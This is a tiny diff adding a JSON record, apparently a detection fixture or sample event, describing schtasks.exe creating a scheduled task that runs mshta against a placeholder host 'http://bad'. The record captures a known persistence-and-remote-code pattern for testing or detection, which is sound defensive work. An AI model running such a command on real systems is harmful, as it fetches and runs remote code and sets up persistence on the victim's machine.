@@ -1,0 +1,4 @@
+{
+  "process": "schtasks.exe",
+  "command_line": "SCHTASKS /Create /TR mshta http://bad"
+}
